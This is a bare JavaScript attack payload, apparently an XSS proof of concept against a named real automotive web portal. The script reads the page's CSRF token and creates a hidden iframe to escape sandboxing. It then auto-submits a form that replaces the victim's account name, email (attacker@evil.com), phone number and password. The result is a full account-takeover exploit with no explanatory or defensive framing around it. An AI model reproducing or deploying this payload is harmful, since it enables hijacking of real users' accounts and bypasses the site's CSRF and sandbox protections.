// Auto-CSRF using a clean iframe to bypass sandbox on ns_foreignField.jsp
(function () {
    // 1. Extract CSRF token from THIS page
    const tokenField = document.querySelector("input[name='CSRFToken']");
    if (!tokenField) return;
    const csrf = tokenField.value;

    // 2. Create a clean iframe NOT affected by the parent sandboxing
    const iframe = document.createElement("iframe");
    iframe.style.display = "none";
    document.body.appendChild(iframe);

    // 3. Wait until iframe is ready
    iframe.onload = function () {

        // Build form inside the iframe document
        const doc = iframe.contentDocument;
        const f = doc.createElement("form");
        f.method = "POST";
        f.action = "https://osa2.audi.de/ve/ns_content.jsp";

        function add(name, value) {
            const input = doc.createElement("input");
            input.type = "hidden";
            input.name = name;
            input.value = value;
            f.appendChild(input);
        }

        // Required parameters
        add("dividerPos", "0");
        add("mouseX", "1065");
        add("mouseY", "280");
        add("focusElement", "userPasswordNew2");
        add("browser", "-422d1c48:19acb3cc742:-7da6$1");
        add("control", "43694");
        add("event", "click");
        add("eventValue", "");
        add("CSRFToken", csrf);
        add("submit", "Submit+Query");

        // Attacker impact
        add("j_43697", "Owned");
        add("j_43699", "ByXSS");
        add("j_43717", "attacker@evil.com");
        add("j_43719", "+19999999999");
        add("j_43734", "NewPass!2025");
        add("j_43736", "NewPass!2025");
        add("j_43739", "true");
        add("j_43688", "0");
        add("j_43685", "0");
        add("formScrollPos", "0");
        add("domainScrollPos", "0");
        add("j_43695", "Frau");

        // Insert and submit
        doc.body.appendChild(f);
        f.submit();
    };

    // Load blank page inside iframe to avoid sandbox inheritance
    iframe.src = "about:blank";

})();
